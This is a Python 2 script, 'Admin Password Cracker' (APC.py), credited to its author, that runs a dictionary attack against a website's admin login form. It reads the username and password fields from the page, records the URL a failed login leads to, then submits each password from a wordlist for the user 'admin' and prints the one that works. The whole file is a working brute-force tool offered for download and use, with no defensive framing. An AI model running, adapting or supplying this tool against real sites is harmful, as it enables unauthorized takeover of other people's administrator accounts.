#!/usr/bin/env python

# File      : Admin Password Cracker. [ APC.py ]
# Auther    : Anurodh Vishwakarma.  [[ Mr. Cipher ]]
# Email     : anurodh792@gmail.com || anurodh792@outlook.com
# Follow at : http://www.facebook.com/anurodhv
# Uses      : APC.py [ admin url ] [ dictioanry path ]
# Ex        : APC.py  http://www.abcd.com/admin  D:\wordlist.txt

# NOTE      : mechanize library must be installed.
#           : Download it form here -> http://www.anurodhvishwakarma.com/mechanize/download.html

# This tool perform the dictionary attack. Try 1024 password per minute [Tested on localhost].
# This tool is open source and freely available to download from http://www.anurodhvishwakarma.com.
# This tool is bydefault crack password for the username admin. 

# NOTE      : If the webpage contain more than to form feild, it just failed. 

# Copyright (c) 2013 http://www.anurodhvishwakarma.com [[ Mr. Cipher ]]

import string
import urllib
import time
import mechanize
import string
import sys
import os
def top(width):
    return '%s%s%s' %('+',('='*(width-2)),'+')
def get_attrs(): # Do not play with this function.
    for form in br.forms():
        form
    myf = str(form)
    a = myf.find('TextControl')
    b = myf.find('PasswordControl')
    c = myf.find('SubmitControl')
    aa = myf[a:b]
    aaa = aa.split('(')
    aaaa = aaa[1].split(')')
    user_feild = aaaa[0].split('=')
    bb = myf[b:c]
    bbb = bb.split('(')
    bbbb = bbb[1].split(')')
    pass_feild = bbbb[0].split('=') 
    return user_feild[0],pass_feild[0]
def banner():
    print "  ___    ___    ___  "
    print " |   |  |   |  |   ' "  
    print " |___|  |   |  |     "
    print " |   |  |---'  |     " 
    print " |   |  |      |___' " + " By Anurodh vishwakarma. "
    return

# os.system('cls')
if len(sys.argv) < 3:
    banner()
    print "\nInsufficient Arguments.\n"
    print "[[ Help menu ]]\n"
    print "Uses     :  APC.py  [ admin url ]  [ dictioanry path ]\n"
    print "Example  :  APC.py http://www.site.com/admin D:\wordlist.txt\n"
    print "            OR \n"       
    print "         :  APC.py http://www.site.com/admin /root/wordlist.txt\n"      
    print "Copyright (c) 2013 http://www.anurodhvishwakarma.com [[ Mr. Cipher ]] "
else:
    admin_url = sys.argv[1]
    path = sys.argv[2]
    ad = admin_url.split('.')
    userid = 'admin'  # Change this value if user admin does not exist.
    if ad[0] != ('http://www' or 'https://www'):
        print "\nPlease apply the argument according to the script require.\n"
        print "Example : APC.py http://www.site.com/admin/login.php D:\wordlist.txt\n"
    else:
        url = urllib.urlopen(admin_url)
        banner()
        print "\n[+] Connecting..."
        time.sleep(1)
        if url.code != 200:
            print "\n[-] Connection error !!!"
            time.sleep(1)
            print "[-] OR page not found."
            print "[-] Please check the url again and then try."
        else:
            fd = open(path,'r')
            fr = fd.read()   # You can use readline().
            passwords = fr.split('\n')
            br = mechanize.Browser()         
            br.open(admin_url)
            # Fetching the form feild attrs.
            username,passwd = get_attrs()
            print "[+] successfully connected to the server."
            time.sleep(1)
            print "[+] Launching attack...\n"
            time.sleep(1.5)
            br.select_form(nr=0)
            # Fetch the error url.
            br.form[username] = 'admin'  
            br.form[passwd] = '' 
            br.submit()
            error_url = br.response().geturl()
            # Try the passwords from dictionary.
            br.open(admin_url)
            for password in passwords:
                br.select_form(nr=0)
                br.form[username] = userid    
                br.form[passwd] = password
                br.submit()
                print str(passwords.index(password)+1)+" Current password is trying :  " + password
                # Test the logged url with error url.
                if br.response().geturl() != error_url:
                    # os.system('cls')
                    banner()
                    print "\n\n[+] Booooo... Password Found !!!"
                    print "[+] Tried "+str(passwords.index(password)+1)+" passwords." 
                    print "[+] Position of password in dictionary is "+str(passwords.index(password)+1)
                    print "\n" + top(len(password)+35)
                    print "|  Your Password For "+ userid +" is : " + password +"  |"
                    print top(len(password)+35)
                    print "\nCopyright (c) 2013 http://www.anurodhvishwakarma.com"
                    break
            if br.response().geturl() == error_url:
                print "\n[-] Sorry ! Password is not in the dictionary."
                print "[-] Try another dictionary."
                print "[-] OR username admin does not exist."
                print "[-] Tried "+str(len(passwords))+" passwords.\n"
                print "Copyright (c) 2013 http://www.anurodhvishwakarma.com"
                                                 

  
    
    
    





